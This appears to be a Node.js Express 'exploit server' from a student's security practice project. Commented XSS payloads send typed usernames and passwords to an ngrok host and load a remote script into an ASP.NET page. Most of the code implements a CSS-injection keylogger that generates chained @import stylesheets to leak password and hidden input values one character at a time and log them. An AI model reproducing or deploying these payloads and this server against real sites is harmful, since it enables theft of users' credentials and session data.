const express = require('express')
const app = express()
const bodyparser = require('body-parser')
const http = require('http')
const fs = require('fs')
const util = require('util')



const port = 8000

app.use(bodyparser.json())
app.use(bodyparser.urlencoded({ extended: true }))

app.listen(port, () => {
    console.log(`Exploit server listeing on  ${port}`)
})

var log = []

app.get('/x2cp', (req, res) => {
    res.send(Object.assign({}, req))
    console.log(req.query)
})

app.post('/x2cp', (req, res) => {
    log.push(req)
    console.log(log)
})

// payload for XSS to capture password
/*
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length){fetch('https://e951fed5.ngrok.io/x2cp?pass=' + this.value + '&name=' + username.value,{
method:'POST',
mode:'no-cors'
});
document.getElementById('username').remove();
document.getElementsByName('password')[0].remove();}">
*/


app.get('/ASP', (req, res) => {
    res.sendFile('test.js', {root: __dirname})
})

//ASP.NET XSS payload
/*
http://localhost:port/(A(%22onerror=%22js=document.createElement`script`;
js.src=`${String.fromCharCode`47`}${String.fromCharCode`47`}8b6de392.ngrok.io${String.fromCharCode`47`}ASP`;
headEl=document.getElementsByTagName`head`[0];
new%20Function`X${document.location.hash.substr`1`}X`%22))
/default.aspx#headEl.appendChild(js)
*/

var pass = ''
var cur_num = 0
var sesions = createSession()
sesions.resolves[1]("yes")

function createSession(length = 150) {
    let resolves = [];
    let promises = [];
    for (let i = 0; i < length; ++i) {
        promises[i] = new Promise(resolve => resolves[i] = resolve);
    }
    resolves[0]('');
    return { promises, resolves };
}

function generate_CSS(num, pass) {
    var root = 'C:\\Users\\Luka\\Desktop\\Faks\\Diplomski\\practise\\styles\\'
    var name = num + '.css'
    //pass
    var data = 'input[value="%s"] {background: url("http://localhost:8000/?leak=%s&q=%s");}\n'
    //hidden
    //var data = 'input[type=hidden][value^="%s"] {background: url("http://localhost:8000/?leak=%s&q=%s");}\n'
    var i = 33
    fs.writeFileSync(root + name, util.format('@import url("http://localhost:8000/?l=%s");\n', num + 1))
    //fs.writeFileSync(root + name, util.format(data, 'ha', 'ha', Math.random()))
    while(i < 256) {
        if (i == 33) {
            fs.appendFileSync(root + name, util.format(data, pass + String.fromCodePoint(i), String.fromCodePoint(i), Math.random()))
        }
        else if(i == 34 || i == 92) {
            fs.appendFileSync(root + name, util.format(data, pass + String.fromCharCode(92) + String.fromCodePoint(i), String.fromCharCode(92) + String.fromCodePoint(i), Math.random()))
        }
        else {
            fs.appendFileSync(root + name, util.format(data, pass + String.fromCodePoint(i), String.fromCodePoint(i), Math.random()))
        }
        i++
    }
    return root + name
}

function generate_mCSS(num) {
    var root = 'C:\\Users\\Luka\\Desktop\\Faks\\Diplomski\\practise\\styles\\'
    if (num.length > 4) {
        return null
    }
    var full_name = root + num + '.css'
    if (num == 1) {
        fs.writeFileSync(full_name, '@import url("http://diplomski/evil.css");\n')
        fs.appendFileSync(full_name, '@import url("http://localhost:8000/?mid=2");')
    }
    else {
        fs.writeFileSync(full_name, util.format('@import url("http://localhost:8000/?l=%s");\n', parseInt(num) - 1))
        fs.appendFileSync(full_name, util.format('@import url("http://localhost:8000/?mid=%s");', parseInt(num) + 1))
    }
    return full_name
}

//C:\\wamp\\www\\dipl\\
//res.sendFile('C:\\Users\\Luka\\Desktop\\Faks\\Diplomski\\practise\\views\\keyloger.css')
app.get('/', async (req, res) => {
    if(req.query.leak) {
        pass += req.query.leak
        console.log(pass)
        sesions.resolves[pass.length + 1](pass)
        res.status(200).send()
    }
    else if(req.query.mid) {
        var full_name = generate_mCSS(req.query.mid)
        if (full_name == null) {
            res.setTimeout(10)
        }
        else {
            res.sendFile(full_name)
        }
    }
    else if(req.query.l && req.query.l > cur_num) {
        cur_num = parseInt(req.query.l)
        let k_value = await sesions.promises[cur_num]
        var pth = generate_CSS(cur_num, pass)
        res.sendFile(pth)
    }
})

app.post('/shared', (req, res) => {
    console.log(req)
    res.send("ok")
})

//[]